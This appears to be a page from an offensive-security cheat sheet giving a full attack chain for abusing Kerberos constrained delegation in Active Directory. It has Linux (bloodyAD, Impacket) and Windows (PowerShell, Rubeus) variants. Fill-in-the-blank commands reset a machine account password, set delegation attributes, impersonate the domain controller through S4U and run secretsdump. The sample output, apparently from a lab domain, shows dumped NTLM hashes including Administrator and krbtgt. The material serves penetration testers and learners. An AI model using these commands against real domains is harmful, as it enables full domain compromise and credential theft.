---
title: "Constrained Delegation"
tags: ["Active Directory", "Constrained Delegation", "Credential Dumping", "Impacket", "KCD", "Pass-The-Ticket", "RBCD", "Silver Ticket", "Ticket Granting Ticket", "Windows"]
---

{{< filter_buttons >}}

### Constrained Delegation

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Control of a Machine Account

```console {class="password"}
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>'
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -p 'Password123!' --host 10.129.31.186 set password 'FS01$' 'Password123!'
[+] Password changed successfully!
```

```console {class="ntlm"}
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>'
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 --host DC.REDELEGATE.VL set password 'FS01$' 'Password123!'
[+] Password changed successfully!
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>'
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -p 'Password123!' -k --host DC.REDELEGATE.VL set password 'FS01$' 'Password123!'
[+] Password changed successfully!
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>'
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -p '2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 -k --host DC.REDELEGATE.VL set password 'FS01$' 'Password123!'
[+] Password changed successfully!
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>'
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -k --host DC.REDELEGATE.VL set password 'FS01$' 'Password123!'
[+] Password changed successfully!
```

#### 2. Set msDS-AllowedToDelegateTo to Target SPN

```console {class="password"}
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v '<SPN>'
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -p 'Password123!' --host DC.REDELEGATE.VL set object 'CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL's msDS-AllowedToDelegateTo has been updated
```

```console {class="ntlm"}
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v '<SPN>'
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 --host DC.REDELEGATE.VL set object 'CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL's msDS-AllowedToDelegateTo has been updated
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v '<SPN>'
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -p 'Password123!' -k --host DC.REDELEGATE.VL set object 'CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL's msDS-AllowedToDelegateTo has been updated
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v '<SPN>'
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -p '2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 -k --host DC.REDELEGATE.VL set object 'CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL's msDS-AllowedToDelegateTo has been updated
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v '<SPN>'
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -k --host DC.REDELEGATE.VL set object 'CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL's msDS-AllowedToDelegateTo has been updated
```
#### 3. Set TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION Flag

```console {class="password"}
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add uac '<TARGET_MACHINE>$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -p 'Password123!' --host DC.REDELEGATE.VL add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

```console {class="ntlm"}
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add uac '<TARGET_MACHINE>$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 --host DC.REDELEGATE.VL add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add uac '<TARGET_MACHINE>$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -p 'Password123!' -k --host DC.REDELEGATE.VL add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add uac '<TARGET_MACHINE>$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -p '2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 -k --host DC.REDELEGATE.VL add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> add uac '<TARGET_MACHINE>$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

```console {class="sample-code"}
$ bloodyAD -d redelegate.vl -u 'helen.frost' -k --host DC.REDELEGATE.VL add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

#### 4. Request a Service Ticket

```console {class="password"}
# Password
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<TARGET_MACHINE>$:<NEW_PASSWORD>' -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<DC_HOSTNAME>'
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.REDELEGATE.VL && impacket-getST 'redelegate.vl/FS01$:Password123!' -dc-ip 10.129.31.186 -spn 'ldap/dc.redelegate.vl' -impersonate 'DC'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

```console {class="ntlm"}
# NTLM
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<TARGET_MACHINE>$' -hashes :<NEW_HASH> -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<DC_HOSTNAME>'
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.REDELEGATE.VL && impacket-getST 'redelegate.vl/FS01$' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.129.31.186 -spn 'ldap/dc.redelegate.vl' -impersonate 'DC'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<TARGET_MACHINE>$:<NEW_PASSWORD>' -k -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<DC_HOSTNAME>'
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.REDELEGATE.VL && impacket-getST 'redelegate.vl/FS01$:Password123!' -k -dc-ip 10.129.31.186 -spn 'ldap/dc.redelegate.vl' -impersonate 'DC'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<TARGET_MACHINE>$' -hashes :<NEW_HASH> -k -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<DC_HOSTNAME>'
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.REDELEGATE.VL && impacket-getST 'redelegate.vl/FS01$' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.129.31.186 -spn 'ldap/dc.redelegate.vl' -impersonate 'DC'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<TARGET_MACHINE>$' -k -no-pass -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<DC_HOSTNAME>'
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.REDELEGATE.VL && impacket-getST 'redelegate.vl/FS01$' -k -no-pass -dc-ip 10.129.31.186 -spn 'ldap/dc.redelegate.vl' -impersonate 'DC'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating DC
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

#### 5. Secrets Dump

```console
# Pass-the-ticket
export KRB5CCNAME=<CCACHE>
```

```console {class="sample-code"}
$ export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

```console
# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-secretsdump -k -no-pass <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.234.50 && impacket-secretsdump -k -no-pass DC.REDELEGATE.VL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Control of a Machine Account

```console
Set-ADAccountPassword -Identity "<TARGET_MACHINE>$" -Reset -NewPassword (ConvertTo-SecureString "<NEW_PASSWORD>" -AsPlainText -Force)
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADAccountPassword -Identity "FS01$" -Reset -NewPassword (ConvertTo-SecureString "Fall2024!" -AsPlainText -Force)
```

#### 2. Set msDS-AllowedToDelegateTo to Target SPN

```console
Set-ADObject -Identity "CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>" -Add @{"msDS-AllowedToDelegateTo"="<SPN>"}
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}
```

#### 3. Set TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION Flag

```console
Set-ADAccountControl -Identity "<TARGET_MACHINE>$" -TrustedToAuthForDelegation $True
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
```

#### 4. Request a Ticket

```console
.\rubeus.exe asktgt /user:<TARGET_MACHINE>$ /password:<NEW_PASSWORD> /domain:<DOMAIN> /nowrap /ptt
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> .\rubeus.exe asktgt /user:FS01$ /password:Password123! /domain:redelegate.vl /nowrap /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 2B576ACBE6BCFDA7294D6BD18041B8FE
[*] Building AS-REQ (w/ preauth) for: 'redelegate.vl\FS01$'
[*] Using domain controller: 10.129.31.186:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFYjCCBV6gAwIBBaEDAgEWooIEdzCCBHNhggRvMIIEa6ADAg---[SNIP]---ypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDXJlZGVsZWdhdGUudmw=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/redelegate.vl
  ServiceRealm             :  REDELEGATE.VL
  UserName                 :  FS01$ (NT_PRINCIPAL)
  UserRealm                :  REDELEGATE.VL
  StartTime                :  11/1/2025 5:04:27 AM
  EndTime                  :  11/1/2025 3:04:27 PM
  RenewTill                :  11/8/2025 4:04:27 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  l5+tzy6qN7IkOHE3SkGfAQ==
  ASREP (key)              :  2B576ACBE6BCFDA7294D6BD18041B8FE
```

#### 5. Request a Service Ticket

```console
.\rubeus.exe s4u /ticket:<BASE64_TICKET> /impersonateuser:<DC_HOSTNAME>$ /domain:<DOMAIN> /msdsspn:<SPN> /dc:<DC> /ptt /nowrap
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> .\rubeus.exe s4u /ticket:doIFYjCCBV6gAwIBBaEDAgEWooIEdzCCBHNhggRvMIIEa6ADAg---[SNIP]---ypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDXJlZGVsZWdhdGUudmw= /impersonateuser:DC$ /domain:redelegate.vl /msdsspn:ldap/dc.redelegate.vl /dc:dc.redelegate.vl /ptt /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'FS01$@REDELEGATE.VL'
[*] Using domain controller: dc.redelegate.vl (10.129.31.186)
[*] Sending S4U2self request to 10.129.31.186:88
[+] S4U2self success!
[*] Got a TGS for 'DC$' to 'FS01$@REDELEGATE.VL'
[*] base64(ticket.kirbi):

      doIFgjCCBX6gAwIBBaEDAgEWooIEmTCCBJVhggSRMIIEjaADAg---[SNIP]---8bDVJFREVMRUdBVEUuVkypEjAQoAMCAQGhCTAHGwVGUzAxJA==

[*] Impersonating user 'DC$' to target SPN 'ldap/dc.redelegate.vl'
[*] Building S4U2proxy request for service: 'ldap/dc.redelegate.vl'
[*] Using domain controller: dc.redelegate.vl (10.129.31.186)
[*] Sending S4U2proxy request to domain controller 10.129.31.186:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'ldap/dc.redelegate.vl':

      doIGMDCCBiygAwIBBaEDAgEWooIFRjCCBUJhggU+MIIFOqADAg---[SNIP]---MwIaADAgECoRowGBsEbGRhcBsQZGMucmVkZWxlZ2F0ZS52bA==
[+] Ticket successfully imported!
```

#### 5. Convert kirbi to ccache

```console
python3 rubeustoccache.py '<BASE64_TGS>' <DC_HOSTNAME>.kirbi <DC_HOSTNAME>.ccache
```

```console {class="sample-code"}
$ python3 rubeustoccache.py 'doIGMDCCBiygAwIBBaEDAgEWooIFRjCCBUJhggU+MIIFOqADAg---[SNIP]---MwIaADAgECoRowGBsEbGRhcBsQZGMucmVkZWxlZ2F0ZS52bA==' dc.kirbi dc.ccache
╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
              By Solomon Sklash
          github.com/SolomonSklash
   Inspired by Zer1t0's ticket_converter.py

[*] Writing decoded .kirbi file to dc.kirbi
[*] Writing converted .ccache file to dc.ccache
[*] All done! Don't forget to set your environment variable: export KRB5CCNAME=dc.ccache
```

#### 6. Secrets Dump

```console
# Pass-the-ticket
export KRB5CCNAME=<CCACHE>
```

```console {class="sample-code"}
$ export KRB5CCNAME=dc.ccache
```

```console
# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-secretsdump -k -no-pass <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.234.50 && impacket-secretsdump -k -no-pass DC.REDELEGATE.VL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}